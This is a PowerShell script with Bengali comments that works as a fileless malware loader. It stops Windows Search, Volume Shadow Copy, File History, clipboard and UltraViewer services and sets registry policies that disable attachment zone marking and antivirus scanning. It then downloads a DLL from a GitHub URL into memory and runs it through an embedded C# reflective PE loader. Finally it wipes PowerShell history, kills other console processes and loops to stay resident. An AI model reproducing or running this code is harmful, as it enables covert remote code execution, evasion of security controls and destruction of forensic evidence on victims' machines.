Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null

Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "UltraViewerService*" -Force -ErrorAction SilentlyContinue

$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"

Invoke-Expression $regCommand1 | Out-Null
Invoke-Expression $regCommand2 | Out-Null

Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

# ==================== MODIFIED SECTION (পুরানো অংশ সরানো হয়েছে) ====================
# DLL ডাউনলোড করছি (ডিস্কে সেভ না করে, শুধু মেমোরিতে byte array হিসেবে)
$url = "https://github.com/desert007/bios/raw/refs/heads/main/version.dll"
$webClient = New-Object System.Net.WebClient
$dllBytes = $webClient.DownloadData($url)

# C# রিফ্লেক্টিভ PE লোডার (ম্যানুয়াল ম্যাপিং, ইম্পোর্ট রেজলভ, DllMain কল)
$loaderCode = @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Collections.Generic;

public static class ManualLoader
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern void RtlMoveMemory(IntPtr dest, IntPtr src, int size);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    delegate bool DllMainDelegate(IntPtr hinstDLL, uint fdwReason, IntPtr lpvReserved);

    public static void Load(byte[] rawData)
    {
        IntPtr pRaw = Marshal.AllocHGlobal(rawData.Length);
        Marshal.Copy(rawData, 0, pRaw, rawData.Length);

        // DOS Header
        if (Marshal.ReadInt16(pRaw) != 0x5A4D) return;
        IntPtr pNt = (IntPtr)(pRaw.ToInt64() + Marshal.ReadInt32((IntPtr)(pRaw.ToInt64() + 0x3C)));
        if (Marshal.ReadInt32(pNt) != 0x00004550) return;

        // Optional Header
        IntPtr pOpt = (IntPtr)(pNt.ToInt64() + 0x18);
        ushort magic = Marshal.ReadInt16(pOpt);
        bool is64 = (magic == 0x20b);

        // ImageBase, SizeOfImage, SizeOfHeaders
        int imgBaseOff = is64 ? 0x18 : 0x1C;
        long imageBase = is64 ? Marshal.ReadInt64((IntPtr)(pOpt.ToInt64() + imgBaseOff)) : Marshal.ReadInt32((IntPtr)(pOpt.ToInt64() + imgBaseOff));
        int sizeOfImage = Marshal.ReadInt32((IntPtr)(pOpt.ToInt64() + 0x38));
        int sizeOfHeaders = Marshal.ReadInt32((IntPtr)(pOpt.ToInt64() + 0x3C));

        // Allocate base memory (preferred base first, fallback otherwise)
        IntPtr pBase = VirtualAlloc((IntPtr)imageBase, (uint)sizeOfImage, 0x3000, 0x40);
        if (pBase == IntPtr.Zero)
            pBase = VirtualAlloc(IntPtr.Zero, (uint)sizeOfImage, 0x3000, 0x40);
        if (pBase == IntPtr.Zero) return;

        // Copy headers
        RtlMoveMemory(pBase, pRaw, sizeOfHeaders);

        // Copy sections
        ushort sectionCount = Marshal.ReadInt16((IntPtr)(pNt.ToInt64() + 0x6));
        IntPtr pSection = (IntPtr)(pNt.ToInt64() + 0x18 + Marshal.ReadInt16((IntPtr)(pNt.ToInt64() + 0x14)));
        for (int i = 0; i < sectionCount; i++)
        {
            IntPtr pName = pSection;
            int virtualSize = Marshal.ReadInt32((IntPtr)(pSection.ToInt64() + 0x8));
            int virtualAddr = Marshal.ReadInt32((IntPtr)(pSection.ToInt64() + 0xC));
            int rawSize = Marshal.ReadInt32((IntPtr)(pSection.ToInt64() + 0x10));
            int rawAddr = Marshal.ReadInt32((IntPtr)(pSection.ToInt64() + 0x14));
            if (rawSize > 0 && virtualAddr < sizeOfImage)
            {
                IntPtr dest = (IntPtr)(pBase.ToInt64() + virtualAddr);
                IntPtr src = (IntPtr)(pRaw.ToInt64() + rawAddr);
                RtlMoveMemory(dest, src, rawSize);
            }
            pSection = (IntPtr)(pSection.ToInt64() + 0x28);
        }

        // Relocations (skip if base matches preferred, else apply)
        if (pBase.ToInt64() != imageBase)
        {
            IntPtr pRelocDir = (IntPtr)(pOpt.ToInt64() + (is64 ? 0x70 : 0x68)); // Directory offset for relocations
            uint relocRVA = (uint)Marshal.ReadInt32(pRelocDir);
            uint relocSize = (uint)Marshal.ReadInt32((IntPtr)(pRelocDir.ToInt64() + 4));
            if (relocRVA > 0 && relocSize > 0)
            {
                IntPtr pReloc = (IntPtr)(pBase.ToInt64() + relocRVA);
                long delta = pBase.ToInt64() - imageBase;
                while (relocSize > 0)
                {
                    uint blockRVA = (uint)Marshal.ReadInt32(pReloc);
                    uint blockSize = (uint)Marshal.ReadInt32((IntPtr)(pReloc.ToInt64() + 4));
                    if (blockRVA == 0) break;
                    int entries = (int)((blockSize - 8) / 2);
                    for (int j = 0; j < entries; j++)
                    {
                        ushort entry = (ushort)Marshal.ReadInt16((IntPtr)(pReloc.ToInt64() + 8 + j * 2));
                        uint type = (uint)(entry >> 12);
                        uint offset = (uint)(entry & 0xFFF);
                        if (type == 0x3) // IMAGE_REL_BASED_HIGHLOW
                        {
                            IntPtr patchAddr = (IntPtr)(pBase.ToInt64() + blockRVA + offset);
                            uint patchVal = (uint)Marshal.ReadInt32(patchAddr);
                            patchVal = (uint)(patchVal + delta);
                            Marshal.WriteInt32(patchAddr, (int)patchVal);
                        }
                        else if (type == 0xA) // IMAGE_REL_BASED_DIR64
                        {
                            IntPtr patchAddr = (IntPtr)(pBase.ToInt64() + blockRVA + offset);
                            ulong patchVal = (ulong)Marshal.ReadInt64(patchAddr);
                            patchVal = (ulong)(patchVal + (ulong)delta);
                            Marshal.WriteInt64(patchAddr, (long)patchVal);
                        }
                    }
                    relocSize -= blockSize;
                    pReloc = (IntPtr)(pReloc.ToInt64() + blockSize);
                }
            }
        }

        // Resolve Imports
        IntPtr pImportDir = (IntPtr)(pOpt.ToInt64() + (is64 ? 0x68 : 0x60));
        uint importRVA = (uint)Marshal.ReadInt32(pImportDir);
        if (importRVA > 0)
        {
            IntPtr pImportDesc = (IntPtr)(pBase.ToInt64() + importRVA);
            while (true)
            {
                uint descRVA = (uint)Marshal.ReadInt32(pImportDesc);
                if (descRVA == 0) break;
                IntPtr pName = (IntPtr)(pBase.ToInt64() + descRVA);
                string dllName = Marshal.PtrToStringAnsi(pName);
                IntPtr hModule = GetModuleHandle(dllName);
                if (hModule == IntPtr.Zero)
                    hModule = LoadLibraryW(dllName); // fallback LoadLibrary (system DLLs will load)
                if (hModule != IntPtr.Zero)
                {
                    IntPtr pThunk = (IntPtr)(pBase.ToInt64() + Marshal.ReadInt32((IntPtr)(pImportDesc.ToInt64() + 0x10))); // OriginalFirstThunk
                    IntPtr pIAT = (IntPtr)(pBase.ToInt64() + Marshal.ReadInt32((IntPtr)(pImportDesc.ToInt64() + 0x14))); // FirstThunk
                    while (true)
                    {
                        uint thunkVal = (uint)Marshal.ReadInt32(pThunk);
                        if (thunkVal == 0) break;
                        IntPtr pFunc = IntPtr.Zero;
                        if ((thunkVal & 0x80000000) == 0)
                        {
                            IntPtr pImportByName = (IntPtr)(pBase.ToInt64() + thunkVal + 2);
                            string funcName = Marshal.PtrToStringAnsi(pImportByName);
                            pFunc = GetProcAddress(hModule, funcName);
                        }
                        else
                        {
                            uint ordinal = thunkVal & 0x7FFFFFFF;
                            pFunc = GetProcAddress(hModule, $"#{ordinal}");
                        }
                        if (pFunc != IntPtr.Zero)
                            Marshal.WriteIntPtr(pIAT, pFunc);
                        pThunk = (IntPtr)(pThunk.ToInt64() + 4);
                        pIAT = (IntPtr)(pIAT.ToInt64() + 4);
                    }
                }
                pImportDesc = (IntPtr)(pImportDesc.ToInt64() + 0x14);
            }
        }

        // Call DllMain (DLL_PROCESS_ATTACH = 1)
        uint entryRVA = (uint)Marshal.ReadInt32((IntPtr)(pOpt.ToInt64() + 0x10));
        if (entryRVA > 0)
        {
            IntPtr pEntry = (IntPtr)(pBase.ToInt64() + entryRVA);
            uint oldProtect;
            VirtualProtect(pEntry, 0x1000, 0x20, out oldProtect);
            DllMainDelegate dllMain = (DllMainDelegate)Marshal.GetDelegateForFunctionPointer(pEntry, typeof(DllMainDelegate));
            dllMain(pBase, 1, IntPtr.Zero);
        }

        Marshal.FreeHGlobal(pRaw);
    }

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr LoadLibraryW(string lpFileName);
}
"@

# লোডার কম্পাইল করে DLL টি Inject করছি
Add-Type -TypeDefinition $loaderCode
[ManualLoader]::Load($dllBytes)

# ==================== MODIFIED SECTION END ====================

Clear-History
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (Test-Path $historyPath) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
}

Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.Parent.Id -ne $PID) {
        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue | Out-Null
    }
}

$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (-not (Test-Path $historyPath)) {
    New-Item -Path $historyPath -ItemType File -Force | Out-Null
} else {
    Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
}

$kernel = $null
[GC]::Collect(); [GC]::WaitForPendingFinalizers()

# ============================================================
#  ৭. অসীম লুপ (পাওয়ারশেল প্রক্রিয়া চালু রাখতে)
# ============================================================
while ($true) {
    Start-Sleep -Seconds 86400
}
